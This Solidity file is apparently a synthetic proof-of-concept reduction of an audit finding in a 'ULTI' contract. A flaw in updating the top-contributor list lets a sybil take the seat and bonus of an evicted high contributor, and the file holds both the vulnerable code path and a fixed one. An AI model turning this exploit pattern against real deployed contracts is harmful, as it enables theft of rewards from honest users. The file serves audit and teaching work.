// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  ULTI — a depositor already on the full top-33 list kicks the lowest
    contributor (Pashov, finding #43911)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: when the list is full and the caller is already on it,
    _updateTopContributors still removes the lowest contributor and then
    set() only updates the existing entry. The list shrinks from 33 to 32.
    A one-wei sybil then takes the freed seat and is paid that seat's
    100 ULTI bonus. The removed contributor, whose score is far higher,
    is paid 0. */

contract ERC20 {
    string public symbol = "ULTI";
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract Board {
    uint256 public constant MAX_TOP_CONTRIBUTORS = 33;
    ERC20 public token;
    bool public fixedMode;
    address[] public keys;
    mapping(address => uint256) public values;
    mapping(address => uint256) public indexPlusOne;
    mapping(address => uint256) public contributionOf;
    uint256 public minContribution;
    address public minContributor;
    address public kicked;
    uint256 public depositCount;
    uint256 public paidCount;

    constructor(ERC20 t, bool fixed_) {
        token = t;
        fixedMode = fixed_;
    }

    function deposit(uint256 amount) external {
        contributionOf[msg.sender] += amount;
        _update(msg.sender, contributionOf[msg.sender]);
        depositCount++;
    }

    function seed(address who, uint256 amount) external {
        contributionOf[who] = amount;
        _update(who, amount);
    }

    function _update(address who, uint256 updated) internal {
        uint256 length = keys.length;
        if (length < MAX_TOP_CONTRIBUTORS) {
            _insert(who, updated);
            if (minContributor == address(0) || updated < minContribution) {
                minContribution = updated;
                minContributor = who;
            }
            return;
        }
        if (updated > minContribution) {
            address doomed = minContributor;
            if (fixedMode) {
                // FIX: remove the lowest only when `who` is a new entry
                bool added = _insert(who, updated);
                if (added) _remove(doomed);
            } else {
                _remove(doomed); // @> VULN: lowest is removed even though `who` is already on the list
                values[who] = updated;
                kicked = doomed;
            }
        }
    }

    function _insert(address who, uint256 val) internal returns (bool added) {
        values[who] = val;
        if (indexPlusOne[who] == 0) {
            keys.push(who);
            indexPlusOne[who] = keys.length;
            added = true;
        }
    }

    function _remove(address key) internal {
        uint256 idx = indexPlusOne[key];
        uint256 last = keys.length;
        address lastKey = keys[last - 1];
        keys[idx - 1] = lastKey;
        indexPlusOne[lastKey] = idx;
        keys.pop();
        indexPlusOne[key] = 0;
        values[key] = 0;
    }

    function pay() external {
        uint256 n = keys.length;
        paidCount = n;
        for (uint256 i = 0; i < n; i++) {
            token.transfer(keys[i], 100 ether);
        }
    }

    function length() external view returns (uint256) {
        return keys.length;
    }

    function contains(address who) external view returns (bool) {
        return indexPlusOne[who] != 0;
    }
}

contract Sybil {
    Board public board;
    bool public poked;

    constructor(Board b) {
        board = b;
    }

    function poke(uint256 amount) external {
        board.deposit(amount);
        poked = true;
    }
}

contract Exploit {
    ERC20 public token; // nonce 1
    Board public board; // nonce 2
    Sybil public sybil; // nonce 3
    address public constant VICTIM = address(uint160(32));

    constructor() {
        token = new ERC20();
        board = new Board(token, false);
        sybil = new Sybil(board);
        token.mint(address(board), 3300 ether);
    }

    function run() external {
        board.deposit(1_000_000 ether);
        for (uint256 i = 1; i <= 32; i++) {
            board.seed(address(uint160(i)), (1000 - i) * 1 ether);
        }
        board.deposit(1 ether);
        sybil.poke(1 ether);
        board.pay();
        require(board.kicked() == VICTIM, "lowest was not removed");
        require(!board.contains(VICTIM), "victim still seated");
        require(board.contains(address(sybil)), "sybil was not seated");
        require(board.length() == 33, "seat count");
        require(token.balanceOf(address(sybil)) == 100 ether, "sybil was paid");
        require(token.balanceOf(VICTIM) == 0, "victim was paid");
    }
}
